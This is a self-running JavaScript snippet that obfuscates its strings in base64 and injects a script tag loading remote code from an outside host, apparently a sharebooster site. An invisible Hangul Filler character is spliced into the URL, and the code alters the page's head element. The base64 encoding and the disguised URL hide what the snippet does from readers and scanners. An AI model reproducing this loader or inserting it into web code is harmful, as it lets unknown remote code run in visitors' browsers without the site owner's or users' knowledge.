(function(){
  const _ = atob;
  const $ = [
    'Y3JlYXRlRWxlbWVudA==', // createElement
    'YXBwZW5kQ2hpbGQ=',     // appendChild
    'c2NyaXB0',             // script
    'dHlwZQ==',             // type
    'dGV4dC9qYXZhc2NyaXB0', // text/javascript
    'c3Jj',                 // src
    'b25sb2Fk',             // onload
    'b25lcnJvcg==',         // onerror
    'bG9n',                 // log
    'ZXJyb3I=',             // error
    'aGVhZA==',             // head
    'ZG9jdW1lbnQ=',         // document
    'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvLmNpdGllcy5vcmcvc2NyaXB0Nw==', // URL base
    'Lmpz' // .js
  ];

  const d = window[_($[11])];
  const s = d[_($[0])](_($[2]));

  // Visibly include the "ㅤ" character in the middle
  const visiblePart = 'ㅤ'; // This character is U+3164 Hangul Filler

  const url = _($[12]) + visiblePart + _($[13]);

  s[_($[5])] = url;
  s[_($[3])] = _($[4]);

  s[_($[6])] = () => console[_($[8])](url + ' loaded successfully.');
  s[_($[7])] = () => console[_($[9])]('Failed to load ' + url);

  d[_($[10])][_($[1])](s);
})();
